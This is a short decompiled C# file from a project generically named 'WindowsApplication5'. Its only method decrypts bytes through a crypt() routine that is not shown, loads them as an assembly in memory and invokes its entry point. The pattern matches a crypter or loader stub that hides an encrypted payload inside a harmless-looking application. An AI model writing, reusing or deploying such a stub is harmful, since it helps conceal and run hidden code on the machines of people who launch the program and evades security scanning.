using System;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication5;

[StandardModule]
internal sealed class Module2
{
	[STAThread]
	public static void main(string[] args)
	{
		object[] parameters = new object[0];
		Assembly assembly = AppDomain.CurrentDomain.Load(Module1.crypt());
		if (assembly.EntryPoint!.GetParameters().Length > 0)
		{
			parameters = new object[1] { args };
		}
		assembly.EntryPoint!.Invoke(null, parameters);
	}
}
